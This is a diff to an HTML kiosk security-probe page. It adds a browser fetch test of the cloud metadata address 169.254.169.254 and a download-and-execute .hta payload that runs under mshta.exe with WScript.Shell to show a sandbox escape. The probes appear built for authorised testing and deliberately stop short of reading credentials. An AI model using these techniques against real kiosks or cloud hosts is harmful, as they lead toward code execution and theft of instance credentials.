@@ -150,6 +150,39 @@
       </div>
     </div>
 
+    <!-- ── Vector 6 ── -->
+    <div class="vector">
+      <div class="vector-head"><h2>6 &middot; Link-local / IMDS reachability (PNA wall check)</h2><span class="id">169.254.169.254</span></div>
+      <div class="vector-body">
+        <p>Attempts a <code>no-cors</code> GET to <code>http://169.254.169.254/latest/meta-data/</code> with a short timeout, and logs <em>which wall stops it</em>. The response is opaque and never read — this proves whether the browser <strong>path</strong> is open, not any credential.</p>
+        <p><strong>Interpretation depends on this page's scheme.</strong> Served over <b>HTTPS</b> (e.g. GitHub Pages) the request is blocked as <em>mixed content</em> before PNA is even reached — so to isolate <em>Private Network Access</em>, host this detector on an <b>HTTP</b> origin you control. The probe logs the current scheme so the result is interpretable. A request that <em>resolves</em> = neither mixed-content nor PNA blocked it (a finding); a fast failure = blocked before send; a timeout = route filtered / not on the instance.</p>
+        <div class="controls">
+          <button class="run" id="v6-run">Probe 169.254.169.254</button>
+          <span class="verdict">
+            <button class="ok"  data-verdict="6">Allowed</button>
+            <button class="bad" data-verdict="6" data-blocked="1">Blocked</button>
+            <button class="meh" data-verdict="6" data-inconc="1">Inconclusive</button>
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Vector 7 ── -->
+    <div class="vector">
+      <div class="vector-head"><h2>7 &middot; Download &rarr; execute scripting host (.hta) — sandbox escape</h2><span class="id">mshta.exe</span></div>
+      <div class="vector-body">
+        <p>Escalation of V1: instead of an <code>.html</code> (browser-bound), this fires a blob download of a benign <code>kiosk-exec-probe.hta</code>. If the shelf lets you <strong>open</strong> it, it runs under <code>mshta.exe</code> — <em>outside</em> the browser, where CORS / SOP / PNA / mixed-content do not exist. The probe only prints <code>domain\\user@host</code> to prove the context escape; it does <strong>not</strong> touch IMDS or read any credential. Mark <b>Blocked</b> if the download type is refused or the OS won't run it; mark <b>Allowed</b> if an mshta window shows the identity line.</p>
+        <div class="controls">
+          <button class="run" id="v7-run">Fire .hta download</button>
+          <span class="verdict">
+            <button class="ok"  data-verdict="7">Allowed</button>
+            <button class="bad" data-verdict="7" data-blocked="1">Blocked</button>
+            <button class="meh" data-verdict="7" data-inconc="1">Inconclusive</button>
+          </span>
+        </div>
+      </div>
+    </div>
+
     <!-- ── Log ── -->
     <div class="log">
       <div class="log-head">
@@ -316,6 +349,74 @@
       };
       reader.onerror = function(){ log('V5', 'blocked', 'FileReader error on dropped file'); };
       reader.readAsArrayBuffer(f.slice(0, 16));
+    });
+
+    // ── Vector 6: link-local / IMDS reachability (PNA wall) ──
+    document.getElementById('v6-run').addEventListener('click', async function(){
+      var scheme = location.protocol.replace(':','');
+      var schemeNote = scheme === 'https'
+        ? 'page is HTTPS — a failure here is MIXED-CONTENT, not PNA; rehost on HTTP to test PNA'
+        : (scheme === 'http'
+            ? 'page is HTTP — a failure here isolates PNA / network filtering'
+            : 'page origin is "' + scheme + '"');
+      log('V6', 'info', 'Probing http://169.254.169.254/latest/meta-data/ (no-cors, 3s timeout) — ' + schemeNote);
+
+      var ctrl = new AbortController();
+      var timer = setTimeout(function(){ ctrl.abort(); }, 3000);
+      var t0 = performance.now();
+      try {
+        // no-cors: opaque response, body never read — reachability signal only
+        await fetch('http://169.254.169.254/latest/meta-data/', { mode:'no-cors', signal:ctrl.signal, cache:'no-store' });
+        clearTimeout(timer);
+        var ms = Math.round(performance.now() - t0);
+        log('V6', 'allowed', 'Request COMPLETED at network layer in ' + ms + 'ms (opaque, unread) — neither mixed-content nor PNA blocked it. Browser path to link-local is OPEN.');
+      } catch (err) {
+        clearTimeout(timer);
+        var ms2 = Math.round(performance.now() - t0);
+        if (err && err.name === 'AbortError'){
+          log('V6', 'warn', 'No response within 3s (' + ms2 + 'ms) — route filtered / dropped / not on an instance with IMDS. Inconclusive.');
+        } else {
+          log('V6', 'blocked', 'Blocked before/at send after ' + ms2 + 'ms: ' + (err && err.name) + ' — ' + (err && err.message) + ' (' + (scheme === 'https' ? 'expected mixed-content block on HTTPS' : 'consistent with PNA/network block on HTTP') + ')');
+        }
+      }
+    });
+
+    // ── Vector 7: download + execute .hta (benign proof-of-execution only) ──
+    document.getElementById('v7-run').addEventListener('click', function(){
+      var hta = [
+        '<!DOCTYPE html>',
+        '<html><head>',
+        '<hta:application id="app" applicationname="KioskExecProbe" scroll="no" singleinstance="yes" />',
+        '<title>Kiosk Execution Probe</title></head>',
+        '<body style="font:15px Segoe UI,system-ui;background:#0f1115;color:#e6e6e6;padding:24px">',
+        '<h2>Execution-context probe</h2>',
+        '<p>If you are reading this in an <b>mshta</b> window (not a browser tab), the kiosk permitted BOTH download and execution of a scripting host — the browser sandbox is escaped.</p>',
+        '<div id="out">reading context…</div>',
+        '<script>',
+        'try {',
+        '  var sh = new ActiveXObject("WScript.Shell");',
+        '  var e = sh.Environment("PROCESS");',
+        '  document.getElementById("out").innerHTML =',
+        '    "RUNNING OUTSIDE THE BROWSER as <b>" + e("USERDOMAIN") + "\\\\" + e("USERNAME") + "</b> on <b>" + e("COMPUTERNAME") + "</b><br>" +',
+        '    "Host process: mshta.exe — CORS / SOP / PNA / mixed-content do not apply in this context.<br>" +',
+        '    "This is where instance-role credentials would be queried from IMDS. This probe intentionally does NOT.";',
+        '} catch (err) {',
+        '  document.getElementById("out").innerText = "WScript.Shell unavailable: " + err.message + " (execution may be constrained)";',
+        '}',
+        '<\/script>',
+        '</body></html>'
+      ].join('\n');
+      try {
+        var blob = new Blob([hta], { type:'application/hta' });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url; a.download = 'kiosk-exec-probe.hta';
+        document.body.appendChild(a); a.click(); a.remove();
+        setTimeout(function(){ URL.revokeObjectURL(url); }, 4000);
+        log('V7', 'info', 'Blob download of kiosk-exec-probe.hta triggered. Open it from the shelf, then mark Allowed (mshta window shows user@host) or Blocked (type refused / won’t execute).');
+      } catch (err) {
+        log('V7', 'blocked', 'Blob download threw: ' + err.name + ' — ' + err.message);
+      }
     });
 
     // ── Export / clear ──
